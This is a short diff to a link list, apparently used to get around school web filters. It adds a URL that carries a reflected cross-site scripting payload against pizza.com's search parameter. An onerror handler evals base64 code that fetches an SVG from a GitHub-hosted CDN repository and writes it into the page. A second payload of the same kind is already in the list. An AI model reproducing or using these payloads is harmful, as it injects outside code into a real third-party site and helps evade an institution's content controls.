@@ -6,6 +6,7 @@ https://dont-pl4y-g4m3s-in-school.shop/?auth=TKT-FC856801E50C32C9
 https://www.securly.com.nogridco.com/
 
 https://gate-keep.live/
+https://pizza.com/?s=<img%20src%20onerror=h=eval,h(atob('ZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9lZXB5Y2xhaXJlL2xlYXJubWF0aGZhc3RAbWFpbi9rb3JvbmEuc3ZnIikudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gdC50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe2RvY3VtZW50LndyaXRlKHQpfSk7'))>
 
 https://s3.amazonaws.com/dynamiclearning/index.html
 https://pizza.com/?s=<img%20src%20onerror=h=eval,h(atob('ZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9jcnNocWQvc3R1cmR5LWxhbXBASEVBRC9hcmN0aWMuc3ZnIikudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gdC50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe2RvY3VtZW50LndyaXRlKHQpfSk7'))>
